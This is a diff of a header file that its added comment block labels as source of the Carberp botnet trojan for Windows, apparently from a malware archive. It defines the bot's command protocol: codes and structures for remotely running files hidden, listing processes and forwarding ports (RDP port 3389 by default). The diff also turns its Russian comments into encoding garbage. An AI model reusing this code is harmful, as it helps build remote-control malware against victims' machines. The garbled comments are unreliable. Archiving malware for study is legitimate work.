@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #pragma once
 
 //==============================================================
@@ -294,12 +305,12 @@ const WORD PK_SC_RUNFILE = 0x19;
 const WORD PK_CS_RUNFILE = 0x819;
 struct FILERUN_CMD
 {
-	DWORD dwSellEx_Or_CreateP;	// метод зпуска 1- createProces 2- ShelExecute
-	DWORD dwStyle;				// свернутый развернутый скрытый..
-	TCHAR filename[MAX_PATH];	// файл для запуска
+	DWORD dwSellEx_Or_CreateP;	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 1- createProces 2- ShelExecute
+	DWORD dwStyle;				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ..
+	TCHAR filename[MAX_PATH];	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 };
 
-const WORD PK_SC_PROCESSLIST = 0x22; //получение списка процессов
+const WORD PK_SC_PROCESSLIST = 0x22; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 const WORD PK_CS_PROCESSLIST  = 0x822;
 
 const WORD PK_SC_RESUMEJAVA = 0x23;
@@ -406,11 +417,11 @@ const WORD PK_SC_CLOSE_DLL	= 0x44;
 
 const WORD PK_SC_PORTFORW = 0x45;
 const WORD PK_CS_PORTFORW = 0x845;
-const int defaultPortForward = 3389; //какой порт нужно пробросить по умолчанию
+const int defaultPortForward = 3389; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 struct PORT_FORW
 {
-	WORD portForw; //порт который нужно пробросить, если 0, то пробрасывается defaultPortForward
-	WORD portConnect; //к какому порту нужно соединиться, чтобы сделать проброс, если 0, то берется тот с которым уже соединились
+	WORD portForw; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ 0, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ defaultPortForward
+	WORD portConnect; //пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ 0, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 };
 
 const WORD PK_SC_ANCStat = 0x46;
